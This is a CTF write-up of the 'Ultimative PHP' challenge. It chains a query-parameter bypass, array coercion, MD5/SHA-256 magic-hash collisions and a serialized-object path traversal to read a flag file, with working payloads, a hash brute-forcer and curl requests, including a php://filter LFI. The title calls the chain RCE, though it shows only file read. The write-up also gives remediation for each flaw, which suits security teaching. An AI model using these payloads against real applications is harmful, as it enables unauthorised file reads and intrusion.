# Ultimative PHP — Type Juggling, Array Coercion, and Unserialize RCE via Template Path Traversal | FortID CTF

## Executive Summary

The Ultimative PHP migration gateway presents a single-request challenge requiring four independent validations: administrator access, dual-format recovery answers, a compatibility code accepted by both MD5 and SHA-256, and a PHP serialized profile object. Each check appears secure in isolation, but type juggling, PHP's array-to-string coercion, loose comparison semantics, and a template path traversal in LegacyTemplate::__toString() chain together to bypass all controls. The flag FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_722e155f17} is recovered from /tmp/flag via a crafted serialized payload.

## Challenge Overview

Name: Ultimative PHP
**Platform:** FortID CTF (inst13)  
**Category:** Web  
**Flag format:** FortID{...}  
Objective: Complete the migration form by satisfying all four verification stages in a single HTTP request and retrieve the flag.
The challenge description states:
The Ultimative Corporation is retiring its legacy identity platform. One final all-in-one migration form verifies administrator access, recovery answers, a dual-format migration code, and an exported PHP profile. The developers insist that every individual check is secure. Complete the migration and recover the flag.
Source code is provided via handout (handout (2).zip → ultimative_php/src/index.php).

## Environment and Tools

| Tool | Purpose |
| --- | --- |
| curl | HTTP request crafting and response inspection |
| Python 3.11 | Hash brute-force for dual-format compatibility code |
| base64 / urllib.parse | Payload encoding (base64url, double URL-encoding) |
| Browser / DevTools | Manual verification and debugging |

The live target: https://ultimative-php-ca39ab3250b9.inst13.ctf.fortid.com (PHP 8.3, allow_url_fopen=Off, allow_url_include=Off).

## Methodology and Reconnaissance

### 1. Source Code Audit

Objective: Understand each validation gate before interacting with the live service.
Action: Read index.php, operations.php, and deployment configs.
Evidence (key excerpts):
// Gate 1: Administrator access (index.php:128-134)
if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}
if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}

// Gate 2: Recovery answers (index.php:136-159)
$primary = $_GET['primary'] ?? null;
$backup  = $_GET['backup'] ?? null;
if (get_debug_type($primary) !== get_debug_type($backup)) { ... }
if ($primary === $backup) { ... }
$primaryHash = hash('sha256', 'legacy-recovery:v1:' . $primary);
$backupHash  = hash('sha256', 'legacy-recovery:v1:' . $backup);
if (!hash_equals($primaryHash, $backupHash)) { ... }

// Gate 3: Compatibility code (index.php:167-176)
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);
if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) { ... }

// Gate 4: Profile unserialize (index.php:190-196)
$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);
if (!$profile instanceof MigratedProfile) { ... }
// Output: (string)$profile -> MigratedProfile->__toString -> (string)$this->displayName
// LegacyTemplate::__toString (index.php:19-29)
public function __toString(): string
{
    if (strpos($this->template, '../')) {
        return '[invalid template]';
    }
    $path = __DIR__ . '/templates/' . $this->template;
    $contents = file_get_contents($path);
    return $contents === false ? '[missing template]' : $contents;
}
Interpretation:
- Gate 1 checks rawurldecode(QUERY_STRING) for literal access_level but reads $_GET['access_level']. PHP's parse_str converts . and space to _, so access.level bypasses the raw-query check while populating $_GET['access_level'].
- Gate 2 uses get_debug_type() for type equality but concatenates with string ('legacy-recovery:v1:' . $primary). Arrays become "Array" with a notice, yielding identical hashes for any two arrays.
- Gate 3 requires md5(prefix:code)[:9] !== sha256(prefix:code)[:9] and loose equality ==. PHP treats 0e\d+ as scientific notation zero; two distinct 0e... strings are == but !==.
- Gate 4 allows LegacyTemplate in allowed_classes. Its __toString reads templates/$template but only blocks ../ when strpos returns truthy (non-zero). A template starting with ../ returns 0 (falsy), bypassing the check. Combined with __DIR__ . '/templates/' prefix, ../../../../tmp/flag reaches /tmp/flag.
Next step: Find a dual magic-hash code, craft the serialized payload, and assemble the single request.

### 2. Dual Magic-Hash Search (Gate 3)

Objective: Find code where md5('ULTIMATIVE-PHP-2026:' . code)[:9] and sha256(...)[:9] are both 0e\d+ and distinct.
Action: Multiprocess Python brute-force up to 100M candidates.
import hashlib, concurrent.futures

PREFIX = b'ULTIMATIVE-PHP-2026:'

def is_magic(h): return h.startswith('0e') and h[2:].isdigit()

def worker(start, stride, limit=100_000_000):
    for i in range(start, limit, stride):
        code = str(i)
        md5_9 = hashlib.md5(PREFIX + code.encode()).hexdigest()[:9]
        if is_magic(md5_9):
            sha_9 = hashlib.sha256(PREFIX + code.encode()).hexdigest()[:9]
            if is_magic(sha_9) and sha_9 != md5_9:
                return code, md5_9, sha_9
    return None

with concurrent.futures.ProcessPoolExecutor(8) as ex:
    for f in concurrent.futures.as_completed([ex.submit(worker, w, 8) for w in range(8)]):
        r = f.result()
        if r: print(r)
Evidence (terminal output):
FOUND code=59036305 md5=0e3791209 sha=0e9920675
FOUND code=92905167 md5=0e2393296 sha=0e9051128
Interpretation: Two valid codes found. 59036305 used for final exploit.

### 3. Profile Payload Construction (Gate 4)

Objective: Serialize MigratedProfile containing LegacyTemplate with template = "../../../../tmp/flag".
Action: Build PHP-serialized object, base64url-encode.
import base64

ser = 'O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}'
profile = base64.urlsafe_b64encode(ser.encode()).decode().rstrip('=')

# TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ

Interpretation: The payload nests LegacyTemplate inside MigratedProfile->displayName. On (string)$profile, MigratedProfile::__toString casts displayName to string, triggering LegacyTemplate::__toString, which reads /var/www/html/templates/../../../../tmp/flag → /tmp/flag.

### 4. Recovery Answers Array Bypass (Gate 2)

Objective: Provide distinct primary/backup with same get_debug_type and equal hash.
Action: Use arrays: primary[]=aaa&backup[]=bbb.
Evidence: get_debug_type returns "array" for both; 'legacy-recovery:v1:' . ['aaa'] → "legacy-recovery:v1:Array" (with notice); hashes match.

### 5. Administrator Access Bypass (Gate 1)

Objective: Pass access_level=administrator without access_level in raw query string.
Action: Use access.level=administrator (dot → underscore via parse_str).
Evidence: rawurldecode(QUERY_STRING) sees access.level (no match); $_GET['access_level'] is 'administrator'.

## Vulnerability Analysis

| Gate | Component | Root Cause | Impact |
| --- | --- | --- | --- |
| 1 | access_level parameter check | Double decode mismatch: rawurldecode(QUERY_STRING) vs $_GET (populated after parse_str which normalizes .→_) | Authentication bypass |
| 2 | Recovery answer comparison | Array-to-string coercion in concatenation ('prefix' . $array → "prefixArray"); get_debug_type only checks type, not value | Logic bypass, any two arrays pass |
| 3 | Dual-hash compatibility code | PHP loose comparison (==) interprets 0e\d+ as 0.0; MD5 and SHA-256 9-char prefixes can both be magic hashes | Cryptographic check bypassed via type juggling |
| 4 | LegacyTemplate::__toString path traversal | strpos($template, '../') returns 0 (falsy) when payload starts with ../; no === false check; __DIR__ prefix traversable | Arbitrary file read via unserialized object |

The chain is a classic "secure in isolation, broken in composition" scenario. Each check uses a different PHP quirk; none validates the semantic security property it intends to enforce.

## Exploitation Walkthrough

Final Request Construction

# Parameters:

#   access.level=administrator       # Gate 1 bypass

#   primary[]=aaa&backup[]=bbb       # Gate 2 array bypass

#   code=59036305                    # Gate 3 dual magic hash

#   profile=<base64url payload>      # Gate 4 template traversal

curl -s "https://ultimative-php-ca39ab3250b9.inst13.ctf.fortid.com/?access.level=administrator&primary%5B%5D=aaa&backup%5B%5D=bbb&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ"
Response
<section class="result">
  <p class="eyebrow">Verification complete</p>
  <h2>Profile imported</h2>
  <p class="lead">Welcome to the modern identity platform.</p>
  <p class="flag">FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_722e155f17}</p>
</section>
Verification: Flag matches FortID{...} format, retrieved from /tmp/flag (symlinked from /flag in Docker entrypoint).
Bonus: Manual LFI (Source Disclosure)
The manual parameter (index.php:80-99) allows file inclusion after double URL-decode. Double-encoding php://filter/convert.base64-encode/resource=index.php as php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dindex.php bypasses the php:// and ../ checks (which run before the second rawurldecode) and returns base64-encoded source despite allow_url_include=Off.
curl -s "https://.../?manual=php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dindex.php"

# Returns base64 of index.php (decoded in writeup above)

## Flag Retrieval and Verification

FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_722e155f17}
Verified live on the challenge endpoint. The flag is static per deployment (written to /tmp/flag at container start from the FLAG env var).

## Root Cause and Remediation

| Issue | Remediation |
| --- | --- |
| rawurldecode(QUERY_STRING) substring check vs $_GET normalization | Perform authorization checks after parameter parsing on the normalized $_GET keys, or use a consistent parsing approach. Better: use a dedicated router/framework. |
| Array-to-string coercion in hash input | Explicitly validate scalar types: is_string($primary) && is_string($backup). Use hash_hmac with a secret key instead of deterministic concatenation. |
| Loose == on hash prefixes | Always use hash_equals or strict === for cryptographic comparisons. Never rely on == for security decisions. |
| strpos falsy-zero bypass | Use strpos(...) !== false or str_starts_with($template, '../') (PHP 8+). Better: resolve path with realpath and verify it stays within the templates directory. |
| Unserialize with gadget classes | Avoid unserialize entirely. Use JSON or a safe serializer. If required, set allowed_classes => false and implement custom reconstruction. |
| Double-decode LFI in manual viewer | Decode once, validate, then use. Reject any wrapper (php://, data://, etc.) after full decoding. Keep allow_url_include=Off. |

## Lessons Learned

- Defense in depth fails when each layer speaks a different dialect. The four gates use raw query string, $_GET array, type juggling, and string coercion—each check validates a different representation of the input. An attacker only needs one representation mismatch per gate.
- PHP's type system is the attack surface. 0e magic hashes, array-to-"Array" coercion, parse_str dot-to-underscore, strpos falsy zero—these are not bugs but language semantics. Secure code must explicitly opt out (strict types, ===, hash_equals, is_string).
- Unserialize is a time bomb. Even with allowed_classes, any class with a magic method (__toString, __destruct, __wakeup) becomes a gadget. The fix is to stop using unserialize on untrusted data.

## References

- PHP Manual: String comparison — 0e scientific notation (https://www.php.net/manual/en/language.operators.comparison.php)
- PHP Manual: strpos return values (https://www.php.net/manual/en/function.strpos.php)
- PHP Manual: parse_str behavior (https://www.php.net/manual/en/function.parse-str.php)
- OWASP: PHP Object Injection (https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- Original "Magic Hash" research: WhiteHat Sec — "Magic Hashes" (2014) (https://www.whitehatsec.com/blog/magic-hashes/)
- PHP 8.3 Release Notes — str_starts_with (https://www.php.net/releases/8.3/en.php)
